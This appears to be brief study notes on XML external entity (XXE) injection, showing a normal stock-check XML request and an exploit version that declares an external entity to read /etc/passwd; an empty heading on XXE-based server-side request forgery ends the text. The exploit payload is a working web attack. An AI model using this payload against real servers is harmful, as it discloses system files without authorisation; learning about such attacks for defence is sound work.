# Types
## Exploiting XXE to retrieve files
perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem.
* Example: <?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
* exploit: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>`

## Exploiting XXE to perform SSRF attacks
